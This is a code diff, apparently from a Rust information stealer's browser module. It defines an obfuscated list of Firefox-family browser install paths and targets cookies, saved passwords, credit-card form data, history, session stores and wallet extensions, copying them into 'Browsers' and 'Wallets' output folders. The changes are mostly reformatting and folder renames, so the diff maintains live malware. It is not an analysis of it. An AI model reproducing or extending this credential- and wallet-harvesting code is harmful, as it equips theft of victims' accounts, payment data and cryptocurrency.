@@ -70,12 +70,10 @@ static GECKO_INSTALL_REGISTRY: Lazy<Vec<(&'static str, Vec<String>)>> = Lazy::ne
         ),
         (
             "LibreWolf",
-            vec![
-                deobf(&[
-                    0x90, 0xAC, 0x85, 0x97, 0x94, 0x82, 0x91, 0x86, 0xE1, 0x9B, 0xD2, 0xBF, 0xCD,
-                    0xDA, 0x90, 0xD2, 0xDB, 0x91,
-                ]),
-            ],
+            vec![deobf(&[
+                0x90, 0xAC, 0x85, 0x97, 0x94, 0x82, 0x91, 0x86, 0xE1, 0x9B, 0xD2, 0xBF, 0xCD, 0xDA,
+                0x90, 0xD2, 0xDB, 0x91,
+            ])],
         ),
         (
             "SeaMonkey",
@@ -215,7 +213,10 @@ impl GeckoDataKind {
             Self::Cookies => &["cookies.sqlite"],
             Self::Autofill => &["formhistory.sqlite"],
             Self::CreditCards => &["formhistory.sqlite"],
-            Self::Sessions => &["sessionstore.jsonlz4", "sessionstore-backups/recovery.jsonlz4"],
+            Self::Sessions => &[
+                "sessionstore.jsonlz4",
+                "sessionstore-backups/recovery.jsonlz4",
+            ],
         }
     }
 }
@@ -261,9 +262,12 @@ impl RecoveryTask for GeckoRecoveryTask {
 
                     if matches!(
                         self.kind,
-                        GeckoDataKind::Cookies | GeckoDataKind::History | GeckoDataKind::Passwords | GeckoDataKind::Sessions
+                        GeckoDataKind::Cookies
+                            | GeckoDataKind::History
+                            | GeckoDataKind::Passwords
+                            | GeckoDataKind::Sessions
                     ) {
-                        let temp_dir = ctx.output_dir.join("browsers").join(self.profile.browser);
+                        let temp_dir = ctx.output_dir.join("Browsers").join(self.profile.browser);
                         let _ = std::fs::create_dir_all(&temp_dir);
                         let dest = temp_dir.join(format!(
                             "{}_{}_{}",
@@ -339,7 +343,6 @@ impl RecoveryTask for GeckoExtensionTask {
                 if extension_dir.exists() {
                     let dest_root = ctx
                         .output_dir
-                        .join("services")
                         .join("Wallets")
                         .join(format!(
                             "{}_{}_{}",
